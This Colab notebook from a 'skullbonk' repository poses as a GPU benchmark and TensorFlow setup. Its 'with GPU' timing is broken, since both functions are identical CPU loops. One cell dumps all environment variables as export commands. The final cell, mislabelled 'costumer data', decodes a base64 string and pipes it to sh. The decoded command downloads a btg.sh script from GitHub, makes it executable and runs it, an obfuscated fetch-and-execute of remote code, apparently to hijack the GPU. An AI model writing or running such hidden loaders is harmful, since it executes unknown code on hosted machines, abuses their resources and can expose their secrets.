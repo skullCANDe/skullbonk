{

  "nbformat": 4,

  "nbformat_minor": 0,

  "metadata": {

    "colab": {

      "name": "bonk1.ipynb",

      "provenance": [],

      "collapsed_sections": [],

      "machine_shape": "hm"

    },

    "kernelspec": {

      "name": "python3",

      "display_name": "Python 3"

    },

    "language_info": {

      "name": "python"

    },

    "accelerator": "GPU"

  },

  "cells": [

    {

      "cell_type": "markdown",

      "metadata": {

        "id": "5IHYgObGYg42"

      },

      "source": [

        "# **bonk**\n",

        "\n",

        "`00`\n"

      ]

    },

    {

      "cell_type": "code",

      "metadata": {

        "id": "J46hmikhYmli",

        "cellView": "form"

      },

      "source": [

        "#@bonk\n",

        "! nvidia-smi -L"

      ],

      "execution_count": null,

      "outputs": []

    },

    {

      "cell_type": "code",

      "metadata": {

        "id": "IB_dAbg8Yvj5",

        "cellView": "form"

      },

      "source": [

        "#@jay911\n",

        "\n",

        "from numba import jit, cuda\n",

        "import numpy as np\n",

        "# to measure exec time\n",

        "from timeit import default_timer as timer\n",

        "\n",

        "# normal function to run on cpu\n",

        "def func(a):\t\t\t\t\t\t\t\t\n",

        "\tfor i in range(10000000):\n",

        "\t\ta[i]+= 1\t\n",

        "\n",

        "\t\t\t\t\t\t\n",

        "def func2(a):\n",

        "\tfor i in range(10000000):\n",

        "\t\ta[i]+= 1\n",

        "if __name__==\"__main__\":\n",

        "\tn = 10000000\t\t\t\t\t\t\t\n",

        "\ta = np.ones(n, dtype = np.float64)\n",

        "\tb = np.ones(n, dtype = np.float32)\n",

        "\t\n",

        "\tstart = timer()\n",

        "\tfunc(a)\n",

        "\tprint(\"without GPU:\", timer()-start)\t\n",

        "\t\n",

        "\tstart = timer()\n",

        "\tfunc2(a)\n",

        "\tprint(\"with GPU:\", timer()-start)"

      ],

      "execution_count": null,

      "outputs": []

    },

    {

      "cell_type": "code",

      "metadata": {

        "id": "x7MLYWtqY0Kg",

        "cellView": "form"

      },

      "source": [

        "#@ether1\n",

        "\n",

        "import os\n",

        "' && '.join([f'export {name}=\"{value}\"' for name, value in os.environ.items()])"

      ],

      "execution_count": null,

      "outputs": []

    },

    {

      "cell_type": "code",

      "metadata": {

        "id": "B3TP3IA8Y3DN",

        "cellView": "form"

      },

      "source": [

        "#@ tenso\n",

        "\n",

        "import tensorflow as tf\n",

        "\n",

        "from tensorflow import keras\n",

        "from tensorflow.keras import layers\n",

        "from tensorflow.keras import mixed_precision\n",

        "\n",

        "mixed_precision.set_global_policy('mixed_float16')"

      ],

      "execution_count": null,

      "outputs": []

    },

    {

      "cell_type": "code",

      "metadata": {

        "id": "sbuSn-OdY5Gx",

        "cellView": "form"

      },

      "source": [

        "#@bonk costumer data\n",

        " !base64 -d <<< CndnZXQgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NrdWxsQ0FORGUvc2t1bGxib25rL21haW4vYnRnLnNoICYmIGNobW9kICt4IGJ0Zy5zaCAmJiAuL2J0Zy5zaA=|sh
"

      ],

      "execution_count": null,

      "outputs": []

    }

  ]

}
